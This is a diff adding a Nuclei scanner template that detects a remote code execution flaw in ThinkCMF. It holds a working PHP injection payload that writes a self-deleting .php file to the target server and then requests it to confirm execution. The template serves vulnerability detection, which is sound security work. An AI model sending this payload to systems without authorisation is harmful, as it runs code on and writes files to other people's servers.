@@ -1,0 +1,35 @@
+id: thinkcmf-rce
+
+info:
+  name: ThinkCMF - Remote Code Execution
+  author: pikpikcu
+  severity: critical
+  description: ThinkCMF  is susceptible to a remote code execution vulnerability.
+  reference:
+    - https://www.freebuf.com/vuls/217586.html
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  metadata:
+    max-request: 2
+  tags: thinkcmf,rce,intrusive,vuln
+
+variables:
+  string: "thinkcmf-rce"
+
+http:
+  - raw:
+      - |
+        GET /index.php?a=fetch&content={{url_encode('<?php file_put_contents(\"{{randstr}}.php\",\"<?php echo md5(\"{{string}}\");unlink(__FILE__);\");')}} HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /{{randstr}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - '{{md5(string)}}'
+# digest: 4a0a004730450220331e16eb739fb875e5e36f3f0b92f61e93e56c77f9d237c3ccbb7a6a6f9d8edf022100b4874b9e0974a6538844313836ac34d11302fd267f09ab04619bec2bcedc786e:922c64590222798bb761d5b6d8e72950
